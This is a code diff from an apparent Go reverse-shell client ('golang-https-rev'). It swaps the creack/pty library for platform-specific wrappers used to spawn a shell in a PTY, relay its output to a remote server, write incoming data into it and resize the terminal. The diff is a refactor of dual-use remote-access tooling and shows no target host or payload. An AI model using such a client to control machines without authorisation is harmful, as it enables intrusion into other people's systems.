@@ -10,7 +10,6 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/creack/pty"
 	"golang-https-rev/pkg/compression"
 	"golang-https-rev/pkg/protocol"
 )
@@ -145,7 +144,7 @@ func (rc *ReverseClient) handlePtyModeCommand() error {
 
 	// Start shell in PTY
 	cmd := exec.Command(shell)
-	ptmx, err := pty.Start(cmd)
+	ptmx, err := startPty(cmd)
 	if err != nil {
 		rc.writer.WriteString(fmt.Sprintf("Failed to start PTY: %v\n", err) + protocol.EndOfOutputMarker + "\n")
 		return rc.writer.Flush()
@@ -168,6 +167,7 @@ func (rc *ReverseClient) handlePtyModeCommand() error {
 	// Start goroutine to forward PTY output to server
 	go func() {
 		buf := make([]byte, 4096)
+		reader := newPtyReader(currentPtyFile)
 		for {
 			// Check if we've exited PTY mode or switched to a different PTY
 			rc.ptyMutex.Lock()
@@ -178,7 +178,7 @@ func (rc *ReverseClient) handlePtyModeCommand() error {
 				break
 			}
 			
-			n, err := currentPtyFile.Read(buf)
+			n, err := reader.Read(buf)
 			if err != nil {
 				if err != io.EOF {
 					log.Printf("PTY read error: %v (shell may have exited)", err)
@@ -250,7 +250,10 @@ func (rc *ReverseClient) handlePtyDataCommand(command string) error {
 	if err != nil {
 		return fmt.Errorf("failed to decompress PTY data: %v", err)
 	}
-	_, err = ptyFile.Write(data)
+	
+	// Use platform-specific wrapper for writing
+	wrapper := wrapPtyFile(ptyFile)
+	_, err = wrapper.Write(data)
 	return err
 }
 
@@ -280,12 +283,8 @@ func (rc *ReverseClient) handlePtyResizeCommand(command string) error {
 		return fmt.Errorf("invalid cols: %v", err)
 	}
 
-	// Set window size using cross-platform pty package
-	ws := &pty.Winsize{
-		Rows: uint16(rows),
-		Cols: uint16(cols),
-	}
-	if err := pty.Setsize(ptyFile, ws); err != nil {
+	// Set window size using platform-specific implementation
+	if err := setPtySize(ptyFile, rows, cols); err != nil {
 		return fmt.Errorf("failed to set window size: %v", err)
 	}
 
